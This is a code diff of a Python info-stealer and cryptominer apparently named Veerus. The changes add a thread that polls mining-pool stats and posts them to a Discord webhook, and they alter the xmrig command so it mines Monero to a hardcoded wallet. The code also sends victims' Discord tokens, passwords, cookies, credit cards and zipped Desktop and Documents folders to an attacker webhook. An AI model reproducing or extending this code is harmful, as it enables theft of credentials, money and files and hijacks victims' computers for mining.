@@ -50,7 +50,7 @@ import zipfile
 from os import walk
 USER_NAME = getpass.getuser()
 
-
+#uuid:  42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq.1c378b61-fbe4-46e8-aa45-220292ff7cab
 """
 
 	globals :
@@ -58,8 +58,16 @@ USER_NAME = getpass.getuser()
 """
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
-chiffre = "webhook667"
+WEBHOOK = "webhook667"
 ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only XMR, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
+
+
+STATSWEBHOOK = "NoWebhook"
+STATSAPI = [
+	"https://api.nanopool.org/v1/xmr/hashrate/" + str(ADDRESS),
+	"https://api.nanopool.org/v1/eth/avghashrate/" + str(ADDRESS),
+	"https://api.nanopool.org/v1/xmr/balance/" + str(ADDRESS)]
+
 
 
 CURRENCYPWNUM = 0
@@ -75,7 +83,7 @@ PROCESS_PATHS = [
 	os.getenv('APPDATA') + "\\"+ str(uuid.uuid4()), 
 	os.getenv('LOCALAPPDATA') + "\\"+ str(uuid.uuid4()),
 ]
-PROCESS_NUM = processnumbers
+PROCESS_NUM = 2
 
 MINE = True #Mine crypto? True/False
 MINING_PERCENT = "30"
@@ -661,7 +669,7 @@ if yes == "yes":
 				zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
 	def MineThreadWin():
 		print("[.] Starting miner if enabled.")
-		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + ' --coin=monero --threads=3 --background')
+		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + '.'+  str(uuid.uuid4()) + '/yazdraw@gmail.com --coin=monero --threads=4 ')
 	def MineThreadLinux():
 		print("[.] Starting miner if enabled.")
 		try:
@@ -711,13 +719,52 @@ if yes == "yes":
 			if MINE == True and checkIfProcessRunning("xmrig") == False:
 				threading.Thread(target=MineThreadWin).start()
 				print("[.] Executing miner..")
-	
-	if(chiffre != "" and chiffre != None):
-		print("[.] Sending")
-		webhook = DiscordWebhook(url=chiffre, username="github.com/0xSxZ/Veerus/")
-		embed = DiscordEmbed(title='New Machine connected', description=f'New machine connected\nInfos : \nGraphic Card : {GPUMODEL.Caption}\nIP : {IP}\nCity : {city}\nCountry : :flag_{country.lower()}:', color='03b2f8')
-		
+	def json_extract(obj, key):
+		"""Recursively fetch values from nested JSON."""
+		arr = []
 
+		def extract(obj, arr, key):
+			"""Recursively search for values of key in JSON tree."""
+			if isinstance(obj, dict):
+				for k, v in obj.items():
+					if isinstance(v, (dict, list)):
+						extract(v, arr, key)
+					elif k == key:
+						arr.append(v)
+			elif isinstance(obj, list):
+				for item in obj:
+					extract(item, arr, key)
+			return arr
+
+		values = extract(obj, arr, key)
+		return values
+
+	def minerstats():
+		if(STATSWEBHOOK != "NoWebhook"):
+			hashrate = ""
+			balanceXMR = ""
+			avgHASHRATE = ""
+			webhook = DiscordWebhook(url=STATSWEBHOOK, username="STATS : github.com/0xSxZ/Veerus/")
+			for i in range(len(STATSAPI)):
+				r = requests.get(STATSAPI[i])
+				result = r.json()["data"]
+				if("hashrate" in STATSAPI[i]):
+					result = r.json()["data"]
+					h1 = str(json_extract(r.json(), "h1"))
+					hashrate = h1
+				elif("balance" in STATSAPI[i]):
+					balanceXMR = result
+				elif("avghashrate" in STATSAPI[i]):
+					avgHASHRATE  = result
+
+			embed = DiscordEmbed(title='Stats :', description=f':chart: Stats of miner : \n\n:bar_chart: Hashrate : {hashrate}\n:chart_with_upwards_trend: AVG hashrate : {avgHASHRATE}\n:moneybag: Balance : {balanceXMR}\nSeding again in 3 minutes..', color='03b2f8')
+			webhook.add_embed(embed)
+			webhook.execute()
+			time.sleep(180)
+	if(WEBHOOK != "" and WEBHOOK != None):
+		print("[.] Sending")
+		webhook = DiscordWebhook(url=WEBHOOK, username="github.com/0xSxZ/Veerus/")
+		embed = DiscordEmbed(title='New Machine connected', description=f'New machine connected\nInfos : \nGraphic Card : {GPUMODEL.Caption}\nIP : {IP}\nCity : {city}\nCountry : :flag_{country.lower()}:', color='03b2f8')
 		webhook.add_embed(embed)
 		
 		webhook.add_file(file=getDisk0rdToken().replace("b'", "\n").replace("'", ""), filename="0xSxZ_On_Github_T0kains.txt")
@@ -744,13 +791,15 @@ if yes == "yes":
 		webhook.add_file(file=currencyCookies, filename="Currency Cookies.txt")
 		embed2 = DiscordEmbed(title='Stealer', description=f'**:key: Passwords : {PASSWORDNUM}\n:cookie: Cookies : {COOKIESNUM}\n:money_with_wings: CreditCards : {CREDITCARDSNUM}\n:money_with_wings: Currency Cookies : {CURRENCYCOOKIESNUM}\n:money_with_wings: Currency Password : {CURRENCYPWNUM}**', color='03b2f8')
 		webhook.add_embed(embed2)
-		webhook.execute()	
+		webhook.execute()
 	connectOption()
 	os.system("cd")
 	getfiles()
-	time.sleep(10)
+	time.sleep(5)
+	print("[.] Sending Stats")
+	threading.Thread(target=minerstats).start()
 	print("[.] Sending Desktop")
-	webhook = DiscordWebhook(url=chiffre, username="github.com/0xSxZ/Veerus/")
+	webhook = DiscordWebhook(url=WEBHOOK, username="github.com/0xSxZ/Veerus/")
 	webhook.add_file(file=open("desktop.zip", "rb").read(), filename="desktop.zip")
-	webhook.add_file(file=open("Documents.zip", "rb").read(), filename="desktop.zip")
+	webhook.add_file(file=open("Documents.zip", "rb").read(), filename="Documents.zip")
 	webhook.execute()
